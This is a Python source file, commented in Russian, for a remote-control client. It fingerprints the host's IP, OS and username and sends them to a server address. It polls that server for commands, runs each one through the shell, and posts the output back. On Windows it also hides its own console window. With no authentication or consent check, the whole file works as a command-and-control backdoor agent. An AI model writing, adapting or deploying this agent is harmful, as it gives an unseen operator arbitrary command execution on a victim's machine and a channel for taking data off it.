#!/usr/bin/env python3
"""
Клиент системы удаленного управления с поддержкой файловой системы
Поддерживает Linux и Windows
Автоматически определяет бесконечные команды и запускает их в отдельных окнах
Поддерживает cd, pwd, переменные окружения и относительные пути
"""

import sys
import json
import time
import platform
import socket
import subprocess
import hashlib
import os
import re
import threading
from datetime import datetime
from typing import Tuple, Optional, Dict, List, Any
import tempfile
import shlex

class FileSystemManager:
    """Управление файловой системой и переменными окружения"""
    
    def __init__(self):
        self.current_dir = os.getcwd()
        self.original_dir = self.current_dir
        self.env_vars = self._get_initial_env()
        self.system = platform.system()
        
    def _get_initial_env(self) -> Dict[str, str]:
        """Получает начальные переменные окружения"""
        env = dict(os.environ)
        env['PWD'] = self.current_dir
        env['OLDPWD'] = self.original_dir
        env['CLIENT_CWD'] = self.current_dir
        return env
    
    def update_env_var(self, key: str, value: str):
        """Обновляет переменную окружения"""
        self.env_vars[key] = value
        if key == 'PWD':
            self.current_dir = value
    
    def expand_variables(self, command: str) -> str:
        """Раскрывает переменные окружения в команде"""
        def replace_var(match):
            var_name = match.group(1)
            # Специальные переменные
            if var_name == 'PWD' or var_name == 'CLIENT_CWD':
                return self.current_dir
            elif var_name == 'OLDPWD':
                return self.original_dir
            elif var_name == 'HOME':
                return os.path.expanduser('~')
            # Обычные переменные окружения
            return self.env_vars.get(var_name, match.group(0))
        
        # Раскрываем ${VAR} и $VAR
        command = re.sub(r'\$\{([^}]+)\}', replace_var, command)
        command = re.sub(r'\$([a-zA-Z_][a-zA-Z0-9_]*)', replace_var, command)
        
        # Раскрываем ~ в домашнюю директорию
        if '~' in command:
            command = command.replace('~', os.path.expanduser('~'))
        
        return command
    
    def resolve_path(self, path: str) -> str:
        """Разрешает относительный путь в абсолютный"""
        if not path:
            return self.current_dir
        
        # Раскрываем переменные
        path = self.expand_variables(path)
        
        # Если путь абсолютный, возвращаем как есть
        if os.path.isabs(path):
            return os.path.normpath(path)
        
        # Относительный путь
        resolved = os.path.join(self.current_dir, path)
        return os.path.normpath(resolved)
    
    def change_directory(self, path: str) -> Tuple[bool, str]:
        """Меняет текущую директорию"""
        try:
            resolved_path = self.resolve_path(path)
            
            # Проверяем существование
            if not os.path.exists(resolved_path):
                return False, f"Директория не существует: {resolved_path}"
            
            if not os.path.isdir(resolved_path):
                return False, f"Не является директорией: {resolved_path}"
            
            # Проверяем доступность
            if not os.access(resolved_path, os.R_OK):
                return False, f"Нет доступа к директории: {resolved_path}"
            
            # Сохраняем старую директорию
            old_dir = self.current_dir
            self.env_vars['OLDPWD'] = old_dir
            
            # Меняем директорию
            self.current_dir = resolved_path
            os.chdir(resolved_path)
            
            # Обновляем переменные окружения
            self.env_vars['PWD'] = resolved_path
            self.env_vars['CLIENT_CWD'] = resolved_path
            
            return True, f"Директория изменена: {old_dir} -> {resolved_path}"
            
        except Exception as e:
            return False, f"Ошибка смены директории: {str(e)}"
    
    def get_current_info(self) -> Dict[str, Any]:
        """Возвращает информацию о текущем состоянии"""
        return {
            'current_dir': self.current_dir,
            'original_dir': self.original_dir,
            'home_dir': os.path.expanduser('~'),
            'env_vars': {k: v for k, v in self.env_vars.items() 
                        if not k.startswith('_') and len(k) < 50},
            'platform': self.system,
            'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
        }
    
    def preprocess_command(self, command: str) -> Tuple[str, Optional[str]]:
        """Обрабатывает специальные команды (cd, pwd, env)"""
        command = command.strip()
        
        # Разбиваем на части
        parts = shlex.split(command, posix=(self.system != 'Windows'))
        if not parts:
            return command, None
        
        cmd = parts[0].lower()
        
        # Обработка cd
        if cmd == 'cd':
            if len(parts) > 1:
                path = parts[1]
                # Специальные случаи
                if path == '-':
                    path = self.env_vars.get('OLDPWD', self.original_dir)
                success, message = self.change_directory(path)
                return '', message
            else:
                # cd без аргументов -> домашняя директория
                success, message = self.change_directory('~')
                return '', message
        
        # Обработка pwd
        elif cmd == 'pwd':
            return f'echo "{self.current_dir}"', None
        
        # Обработка env / set (вывод переменных)
        elif cmd in ['env', 'set']:
            env_output = [f"{k}={v}" for k, v in sorted(self.env_vars.items()) 
                         if not k.startswith('_') and len(k) < 50]
            return f'echo "{chr(10).join(env_output[:20])}"', None
        
        # Обработка echo с переменными
        elif cmd == 'echo':
            expanded = self.expand_variables(command[4:].strip())
            return f'echo {shlex.quote(expanded)}', None
        
        # Обработка ls/dir с текущей директорией
        elif cmd in ['ls', 'dir']:
            # Добавляем путь если не указан
            if len(parts) == 1:
                return f'{command} "{self.current_dir}"', None
        
        # Для других команд раскрываем переменные
        else:
            expanded = self.expand_variables(command)
            return expanded, None
        
        return command, None

class SystemInfo:
    """Информация о системе"""
    
    @staticmethod
    def get_ip() -> str:
        """Получает IP адрес системы"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            try:
                hostname = socket.gethostname()
                return socket.gethostbyname(hostname)
            except:
                return "127.0.0.1"
    
    @staticmethod
    def get_os() -> str:
        """Получает информацию об операционной системе"""
        system = platform.system()
        release = platform.release()
        
        if system == "Windows":
            return f"Windows {release}"
        elif system == "Linux":
            try:
                if os.path.exists("/etc/os-release"):
                    with open("/etc/os-release", "r") as f:
                        for line in f:
                            if line.startswith("PRETTY_NAME="):
                                return line.split("=")[1].strip().strip('"')
                return f"Linux {release}"
            except:
                return f"Linux {release}"
        elif system == "Darwin":
            return f"macOS {release}"
        else:
            return f"{system} {release}"
    
    @staticmethod
    def get_terminal() -> Optional[str]:
        """Определяет доступный терминал для Linux"""
        if platform.system() != "Linux":
            return None
        
        terminals = [
            "gnome-terminal", "konsole", "xfce4-terminal",
            "terminator", "alacritty", "kitty", "xterm",
            "urxvt", "st", "rxvt"
        ]
        
        for term in terminals:
            try:
                subprocess.run(["which", term], 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE, 
                             check=True)
                return term
            except:
                continue
        
        return None

class CommandAnalyzer:
    """Анализирует команды и определяет их тип"""
    
    INFINITE_PATTERNS = [
        r'^\s*(python|python3|node|npm|npx|php|ruby|irb|perl|bash|sh|zsh|fish|cmd|powershell|pwsh)\s*$',
        r'^\s*(python|python3|node|php|ruby|perl)\s+[^-]*$',
        r'^\s*(vim|vi|nano|emacs|code|sublime|gedit|kate|atom|npp|notepad\+\+?)\b',
        r'^\s*(gedit|kate|mousepad|leafpad|geany|libreoffice)\b',
        r'^\s*(notepad|wordpad|mspaint|calc|winword|excel|powerpnt)\b',
        r'^\s*(start\s+|open\s+|xdg-open\s+|explorer\s+)',
        r'^\s*(service\s+|systemctl\s+)(start|stop|restart|status)',
        r'^\s*(docker\s+run\s+|docker-compose\s+up\s+)',
        r'^\s*(top|htop|glances|nmon|iftop|iotop)\b',
        r'^\s*tail\s+-f\b',
        r'^\s*ping\b.*(-t|forever)',
        r'^\s*ssh\b',
        r'^\s*(vlc|mpv|mplayer|smplayer|totem)\b',
        r'^\s*(firefox|chrome|chromium|brave|opera|edge)\b',
        r'^\s*(mysql|psql|sqlite3|mongo|redis-cli)\b',
        r'^\s*(nautilus|nemo|thunar|dolphin|pcmanfm)\b',
        r'^\s*(nc\s+-l|netcat\s+-l|socat\s+)',
    ]
    
    BACKGROUND_PATTERNS = [
        r'^\s*(python|python3|node|php|ruby|perl)\s+.*(--help|-h|--version|-v)\b',
        r'^\s*.*\.(py|js|php|rb|pl|sh)\s+.*(--help|-h|--version)',
        r'^\s*ping\b.*(-c\s+\d+|count\s+\d+)',
        r'^\s*.*\s+>\s+.*$',
        r'^\s*.*\s+\|\s+.*$',
    ]
    
    SPECIAL_PATTERNS = {
        'windows_explorer': r'^\s*explorer\s+(\.|"[^"]+"|\'[^\']+\'|\S+)',
        'linux_file_manager': r'^\s*(nautilus|nemo|thunar|dolphin|pcmanfm)\s+(\.|\S+)',
    }
    
    @classmethod
    def analyze(cls, command: str) -> dict:
        """Анализирует команду и возвращает информацию о ней"""
        command = command.strip()
        result = {
            'original': command,
            'is_infinite': False,
            'requires_window': False,
            'is_special': False,
            'special_type': None,
            'description': 'Обычная команда',
        }
        
        for pattern in cls.BACKGROUND_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                result['description'] = 'Фоновая команда'
                return result
        
        for spec_type, pattern in cls.SPECIAL_PATTERNS.items():
            if re.search(pattern, command, re.IGNORECASE):
                result.update({
                    'is_special': True,
                    'special_type': spec_type,
                    'requires_window': True,
                    'description': f'Специальная команда: {spec_type}',
                })
                return result
        
        for pattern in cls.INFINITE_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                result.update({
                    'is_infinite': True,
                    'requires_window': True,
                    'description': 'Интерактивная команда',
                })
                break
        
        if not result['requires_window']:
            file_ext_pattern = r'\.(py|js|php|rb|pl|sh|bat|cmd|exe|app)\b'
            if re.search(file_ext_pattern, command, re.IGNORECASE):
                if not re.search(r'--help|-h|--version|-v', command):
                    result.update({
                        'is_infinite': True,
                        'requires_window': True,
                        'description': 'Запуск исполняемого файла',
                    })
        
        return result

class CommandExecutor:
    """Выполняет команды с учетом их типа"""
    
    def __init__(self, fs_manager: FileSystemManager):
        self.system = platform.system()
        self.analyzer = CommandAnalyzer()
        self.fs = fs_manager
    
    def execute(self, command: str) -> Tuple[int, str]:
        """Выполняет команду и возвращает результат"""
        # Сначала обрабатываем специальные команды (cd, pwd и т.д.)
        processed_cmd, special_output = self.fs.preprocess_command(command)
        
        # Если команда была обработана (например, cd)
        if special_output is not None:
            print(f"[Внутренняя команда] {command}")
            print(f"[Результат] {special_output}")
            return 0, special_output
        
        # Если команда пустая после обработки (cd без вывода)
        if not processed_cmd.strip():
            return 0, ""
        
        # Анализируем оставшуюся команду
        analysis = self.analyzer.analyze(processed_cmd)
        
        print(f"\n[Анализ] {analysis['description']}")
        print(f"[Команда] {processed_cmd}")
        print(f"[Директория] {self.fs.current_dir}")
        
        if analysis['requires_window']:
            return self._execute_in_window(processed_cmd, analysis)
        else:
            return self._execute_in_background(processed_cmd)
    
    def _execute_in_window(self, command: str, analysis: dict) -> Tuple[int, str]:
        """Запускает команду в отдельном окне"""
        try:
            if self.system == "Windows":
                return self._execute_windows_window(command, analysis)
            elif self.system == "Linux":
                return self._execute_linux_window(command, analysis)
            elif self.system == "Darwin":
                return self._execute_macos_window(command)
            else:
                return self._execute_fallback(command)
        
        except Exception as e:
            error_msg = f"Ошибка запуска в окне: {str(e)}"
            print(f"[Ошибка] {error_msg}")
            return -1, error_msg
    
    def _execute_windows_window(self, command: str, analysis: dict) -> Tuple[int, str]:
        """Запуск в окне на Windows"""
        
        if analysis['special_type'] == 'windows_explorer':
            match = re.search(r'explorer\s+(\.|\S+)', command)
            if match:
                path = match.group(1).strip('"\'').strip()
                resolved_path = self.fs.resolve_path(path)
                subprocess.Popen(['explorer', resolved_path], shell=False)
                return 0, f"Проводник открыт: {resolved_path}"
        
        if command.lower().startswith('start '):
            actual_command = command[6:].strip()
            subprocess.Popen(actual_command, shell=True, cwd=self.fs.current_dir)
            return 0, f"Команда запущена: {actual_command}"
        
        # Подготавливаем команду с учетом текущей директории
        batch_content = f"""@echo off
chcp 65001 >nul
title Удаленное выполнение: {command[:50]}
echo Текущая директория: {self.fs.current_dir}
echo Команда: {command}
echo.
cd /d "{self.fs.current_dir}"
{command}
echo.
echo [Сессия завершена]
echo Текущая директория: %cd%
echo Нажмите любую клавишу для закрытия окна...
pause >nul
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', 
                                        delete=False, encoding='cp866') as f:
            f.write(batch_content)
            batch_file = f.name
        
        try:
            subprocess.Popen(
                ['cmd', '/c', 'start', 'cmd', '/k', f'"{batch_file}"'],
                shell=False
            )
            
            def cleanup():
                time.sleep(5)
                try:
                    os.unlink(batch_file)
                except:
                    pass
            
            threading.Thread(target=cleanup, daemon=True).start()
            
            return 0, f"Команда запущена в новом окне CMD"
            
        except Exception as e:
            try:
                os.unlink(batch_file)
            except:
                pass
            subprocess.Popen(command, shell=True, cwd=self.fs.current_dir)
            return 0, f"Команда запущена в фоне (fallback)"
    
    def _execute_linux_window(self, command: str, analysis: dict) -> Tuple[int, str]:
        """Запуск в окне на Linux"""
        
        if analysis['special_type'] == 'linux_file_manager':
            match = re.search(r'(nautilus|nemo|thunar|dolphin|pcmanfm)\s+(\.|\S+)', command)
            if match:
                manager = match.group(1)
                path = match.group(2).strip('"\'').strip()
                resolved_path = self.fs.resolve_path(path)
                subprocess.Popen([manager, resolved_path], 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
                return 0, f"Файловый менеджер {manager} открыт: {resolved_path}"
        
        terminal = SystemInfo.get_terminal()
        if not terminal:
            subprocess.Popen(command, shell=True, cwd=self.fs.current_dir,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            return 0, "Команда запущена в фоне (терминал не найден)"
        
        script_content = f"""#!/bin/bash
echo "Текущая директория: {self.fs.current_dir}"
echo "Команда: {command}"
echo ""
cd "{self.fs.current_dir}"
{command}
echo ""
echo "[Сессия завершена]"
echo "Текущая директория: $(pwd)"
echo "Нажмите Enter для закрытия окна..."
read
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', 
                                        delete=False, encoding='utf-8') as f:
            f.write(script_content)
            script_file = f.name
        
        os.chmod(script_file, 0o755)
        
        try:
            if terminal == "gnome-terminal":
                subprocess.Popen(["gnome-terminal", "--", "bash", "-c", 
                                f"'{script_file}'; exec bash"])
            elif terminal == "konsole":
                subprocess.Popen(["konsole", "-e", "bash", "-c", 
                                f"'{script_file}'; exec bash"])
            elif terminal == "xfce4-terminal":
                subprocess.Popen(["xfce4-terminal", "-e", 
                                f"bash -c '{script_file}; exec bash'"])
            elif terminal == "xterm":
                subprocess.Popen(["xterm", "-e", 
                                f"bash -c '{script_file}; exec bash'"])
            else:
                subprocess.Popen([terminal, "-e", 
                                f"bash -c '{script_file}; exec bash'"])
            
            def cleanup():
                time.sleep(5)
                try:
                    os.unlink(script_file)
                except:
                    pass
            
            threading.Thread(target=cleanup, daemon=True).start()
            
            return 0, f"Команда запущена в терминале {terminal}"
            
        except Exception as e:
            try:
                os.unlink(script_file)
            except:
                pass
            subprocess.Popen(command, shell=True, cwd=self.fs.current_dir,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            return 0, "Команда запущена в фоне (ошибка терминала)"
    
    def _execute_macos_window(self, command: str) -> Tuple[int, str]:
        """Запуск в окне на macOS"""
        applescript = f'''
        tell application "Terminal"
            activate
            do script "cd \\"{self.fs.current_dir}\\" && {command.replace('"', '\\\\"')}"
        end tell
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.scpt', 
                                        delete=False, encoding='utf-8') as f:
            f.write(applescript)
            script_file = f.name
        
        try:
            subprocess.Popen(["osascript", script_file])
            
            def cleanup():
                time.sleep(3)
                try:
                    os.unlink(script_file)
                except:
                    pass
            
            threading.Thread(target=cleanup, daemon=True).start()
            
            return 0, "Команда запущена в Terminal"
        except:
            subprocess.Popen(command, shell=True, cwd=self.fs.current_dir)
            return 0, "Команда запущена в фоне"
    
    def _execute_fallback(self, command: str) -> Tuple[int, str]:
        """Резервный метод запуска"""
        subprocess.Popen(command, shell=True, cwd=self.fs.current_dir,
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
        return 0, "Команда запущена в фоне (резервный метод)"
    
    def _execute_in_background(self, command: str, timeout: int = 30) -> Tuple[int, str]:
        """Выполняет команду в фоне с таймаутом"""
        try:
            env = os.environ.copy()
            env.update(self.fs.env_vars)
            
            if self.system == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    cwd=self.fs.current_dir,
                    env=env,
                    startupinfo=startupinfo
                )
            else:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    cwd=self.fs.current_dir,
                    env=env,
                    preexec_fn=os.setsid if hasattr(os, 'setsid') else None
                )
            
            try:
                output, _ = proc.communicate(timeout=timeout)
                exit_code = proc.returncode
                
                if output:
                    output = output.strip()
                
                return exit_code, output or "(нет вывода)"
                
            except subprocess.TimeoutExpired:
                proc.kill()
                if self.system != "Windows" and hasattr(os, 'killpg'):
                    os.killpg(os.getpgid(proc.pid), 9)
                
                return -1, f"ТАЙМАУТ: Команда выполнялась более {timeout} секунд"
        
        except Exception as e:
            return -1, f"Ошибка выполнения: {str(e)}"

class NetworkClient:
    """Сетевая часть клиента"""
    
    def __init__(self, server_addr: str):
        self.server_addr = server_addr
        if not server_addr.startswith(('http://', 'https://')):
            self.server_addr = 'http://' + server_addr
    
    def send_request(self, path: str, data: dict) -> dict:
        """Отправляет HTTP запрос на сервер"""
        import urllib.request
        import urllib.error
        
        url = f"{self.server_addr}{path}"
        req_data = json.dumps(data).encode('utf-8')
        
        req = urllib.request.Request(
            url,
            data=req_data,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'RemoteClient/3.0'
            },
            method='POST'
        )
        
        try:
            response = urllib.request.urlopen(req, timeout=10)
            return json.loads(response.read().decode('utf-8'))
        except urllib.error.URLError as e:
            if hasattr(e, 'code'):
                raise Exception(f"HTTP {e.code}: {e.reason}")
            else:
                raise Exception(f"Сеть: {e.reason}")
        except Exception as e:
            raise Exception(f"Запрос: {str(e)}")

class RemoteClient:
    """Основной класс клиента"""
    
    def __init__(self, server_addr: str):
        self.server_addr = server_addr
        self.network = NetworkClient(server_addr)
        self.fs = FileSystemManager()
        self.executor = CommandExecutor(self.fs)
        
        # Информация о системе
        self.ip = SystemInfo.get_ip()
        self.os = SystemInfo.get_os()
        self.client_id = self._generate_id()
        
        # Состояние
        self.last_command = ""
        self.error_count = 0
        self.running = True
    
    def _generate_id(self) -> str:
        """Генерирует уникальный ID клиента"""
        seed = f"{self.ip}{self.os}{os.getpid()}{time.time()}"
        return hashlib.md5(seed.encode()).hexdigest()[:12]
    
    def _hide_window(self):
        """Скрывает консольное окно на Windows"""
        if platform.system() == "Windows" and not sys.stdout.isatty():
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            except:
                pass
    
    def display_header(self):
        """Отображает информацию о клиенте"""
        fs_info = self.fs.get_current_info()
        
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║           КЛИЕНТ УДАЛЕННОГО УПРАВЛЕНИЯ v2.0                 ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║ ID:        {self.client_id:<30} ║")
        print(f"║ Система:   {self.os[:30]:<30} ║")
        print(f"║ IP:        {self.ip:<30} ║")
        print(f"║ Пользователь: {fs_info['username'][:20]:<20}        ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║ Текущая директория:                                        ║")
        print(f"║   {fs_info['current_dir'][:56]:<56} ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║ Поддерживаются: cd, pwd, env, ~, $VAR, относительные пути   ║")
        print("║ Ожидание команд... (Ctrl+C для выхода)                      ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print()
    
    def check_for_commands(self) -> Optional[str]:
        """Проверяет наличие новых команд"""
        try:
            response = self.network.send_request('/check', {
                'client_id': self.client_id,
                'ip': self.ip,
                'os': self.os,
                'last_command': self.last_command,
                'current_dir': self.fs.current_dir  # Добавляем текущую директорию
            })
            
            return response.get('command', '')
            
        except Exception as e:
            self.error_count += 1
            if self.error_count % 3 == 0:
                timestamp = datetime.now().strftime('%H:%M:%S')
                print(f"[{timestamp}] Ошибка: {str(e)[:60]}")
            return None
    
    def send_result(self, command_str: str, exit_code: int, output: str):
        """Отправляет результат выполнения команды"""
        try:
            self.network.send_request('/result', {
                'client_id': self.client_id,
                'command': command_str,
                'exit_code': exit_code,
                'output': output,
                'current_dir': self.fs.current_dir  # Отправляем актуальную директорию
            })
            self.error_count = 0
        except Exception as e:
            print(f"[Ошибка отправки] {str(e)[:50]}")
    
    def process_command(self, command_str: str):
        """Обрабатывает полученную команду"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"\n[{timestamp}] Получена команда")
        
        parts = command_str.split('|', 1)
        if len(parts) < 2:
            print("[Ошибка] Неверный формат команды")
            return
        
        cmd_text = parts[1]
        print(f"[Выполняю] {cmd_text}")
        print(f"[Директория] {self.fs.current_dir}")
        
        # Выполняем команду
        exit_code, output = self.executor.execute(cmd_text)
        
        # Обновляем информацию о файловой системе
        fs_info = self.fs.get_current_info()
        
        # Логируем результат
        if exit_code == 0:
            print(f"[✓ Успех] Код: {exit_code}")
        else:
            print(f"[✗ Ошибка] Код: {exit_code}")
        
        # Показываем новую директорию если она изменилась
        if fs_info['current_dir'] != self.fs.current_dir:
            print(f"[Директория изменена] {fs_info['current_dir']}")
        
        if output and len(output) > 0:
            lines = output.split('\n')
            if len(lines) > 10:
                print("[Вывод (первые 10 строк)]:")
                for line in lines[:10]:
                    print(f"  {line}")
                print(f"  ... и еще {len(lines) - 10} строк")
            elif len(output) > 200:
                print(f"[Вывод] {output[:200]}...")
            else:
                print(f"[Вывод] {output}")
        
        # Отправляем результат на сервер
        self.send_result(command_str, exit_code, output)
        
        # Сохраняем как последнюю выполненную команду
        self.last_command = command_str
    
    def run(self):
        """Основной цикл клиента"""
        self._hide_window()
        self.display_header()
        
        while self.running:
            try:
                command = self.check_for_commands()
                
                if command is None:
                    if self.error_count > 10:
                        print("[Переподключение] Жду 30 секунд...")
                        time.sleep(30)
                        self.error_count = 0
                    else:
                        time.sleep(10)
                    continue
                
                if command and command != self.last_command:
                    self.process_command(command)
                
                time.sleep(3)
                
            except KeyboardInterrupt:
                print("\n[Завершение] Остановка клиента...")
                self.running = False
                break
            
            except Exception as e:
                print(f"[Критическая ошибка] {str(e)}")
                time.sleep(10)

def main():
    """Точка входа"""
    if len(sys.argv) != 2:
        print("Использование: python client.py сервер:порт")
        print("Примеры:")
        print("  python client.py 192.168.1.100:54321")
        print("  python client.py localhost:8080")
        print()
        print("Поддерживаемые команды:")
        print("  cd <путь>          - сменить директорию")
        print("  cd ~              - перейти в домашнюю директорию")
        print("  cd -              - вернуться в предыдущую директорию")
        print("  pwd               - показать текущую директорию")
        print("  ls <путь>         - список файлов")
        print("  dir <путь>        - список файлов (Windows)")
        print("  echo $PWD         - показать переменную окружения")
        print("  echo ~/Documents  - раскрыть домашнюю директорию")
        sys.exit(1)
    
    server_addr = sys.argv[1]
    
    try:
        client = RemoteClient(server_addr)
        client.run()
    except Exception as e:
        print(f"Фатальная ошибка: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()